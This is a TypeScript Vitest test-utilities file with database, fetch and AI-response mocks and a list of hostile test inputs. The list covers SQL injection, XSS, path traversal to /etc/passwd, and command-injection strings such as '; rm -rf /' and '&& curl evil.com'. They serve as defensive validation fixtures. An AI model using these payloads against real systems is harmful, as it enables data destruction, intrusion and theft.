/**
 * Test Utilities
 * Common mocks and helpers for testing
 */

import { vi } from 'vitest';

// ═══════════════════════════════════════════════════════════════════════════
// Database Mocking
// ═══════════════════════════════════════════════════════════════════════════

export function createMockDb() {
  const data: Map<string, unknown[]> = new Map();

  return {
    prepare: vi.fn((sql: string) => ({
      run: vi.fn((...params: unknown[]) => ({ lastInsertRowid: 1, changes: 1 })),
      get: vi.fn((...params: unknown[]) => undefined),
      all: vi.fn((...params: unknown[]) => []),
    })),
    exec: vi.fn(),
  };
}

// ═══════════════════════════════════════════════════════════════════════════
// API Response Mocking
// ═══════════════════════════════════════════════════════════════════════════

export function createMockFetch(responses: Map<string, unknown>) {
  return vi.fn(async (url: string) => {
    const response = responses.get(url);
    if (!response) {
      return {
        ok: false,
        status: 404,
        json: async () => ({ error: 'Not found' }),
      };
    }
    return {
      ok: true,
      status: 200,
      json: async () => response,
    };
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// AI Provider Mocking
// ═══════════════════════════════════════════════════════════════════════════

export function createMockAIResponse(content: string, toolCalls: unknown[] = []) {
  return {
    content,
    toolCalls,
    usage: { promptTokens: 100, completionTokens: 50, totalTokens: 150 },
    model: 'test-model',
    provider: 'test',
  };
}

export function createMockStreamChunks(text: string) {
  return text.split('').map((char, i, arr) => ({
    content: char,
    done: i === arr.length - 1,
  }));
}

// ═══════════════════════════════════════════════════════════════════════════
// Security Test Helpers
// ═══════════════════════════════════════════════════════════════════════════

export const MALICIOUS_INPUTS = {
  sqlInjection: [
    "'; DROP TABLE users; --",
    "1; DELETE FROM alerts WHERE 1=1; --",
    "' OR '1'='1",
    "1 UNION SELECT * FROM users",
    "'; EXEC xp_cmdshell('dir'); --",
  ],
  xss: [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
  ],
  commandInjection: [
    '; rm -rf /',
    '| cat /etc/passwd',
    '$(whoami)',
    '`id`',
    '&& curl evil.com',
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32',
    '/etc/passwd',
    'file:///etc/passwd',
  ],
  prototypePolllution: [
    '__proto__',
    'constructor',
    'prototype',
    '__defineGetter__',
  ],
  oversizedInputs: [
    'A'.repeat(10000),
    'A'.repeat(100000),
    'A'.repeat(1000000),
  ],
  unicodeExploits: [
    '\u0000', // null byte
    '\uFEFF', // BOM
    '\u202E', // RTL override
    '\uD800', // unpaired surrogate
  ],
};

export const VALID_SYMBOLS = ['AAPL', 'NVDA', 'MSFT', 'GOOGL', 'BTC', 'ETH'];
export const INVALID_SYMBOLS = ['', '   ', 'TOOLONGSYMBOL', '123', '@#$%'];

// ═══════════════════════════════════════════════════════════════════════════
// Assertion Helpers
// ═══════════════════════════════════════════════════════════════════════════

export function doesNotThrow(fn: () => void | Promise<void>): boolean {
  try {
    fn();
    return true;
  } catch {
    return false;
  }
}

export async function asyncDoesNotThrow(fn: () => Promise<void>): Promise<boolean> {
  try {
    await fn();
    return true;
  } catch {
    return false;
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// Timing Helpers
// ═══════════════════════════════════════════════════════════════════════════

export function wait(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

export async function withTimeout<T>(promise: Promise<T>, ms: number): Promise<T> {
  const timeout = new Promise<never>((_, reject) => {
    setTimeout(() => reject(new Error(`Timeout after ${ms}ms`)), ms);
  });
  return Promise.race([promise, timeout]);
}
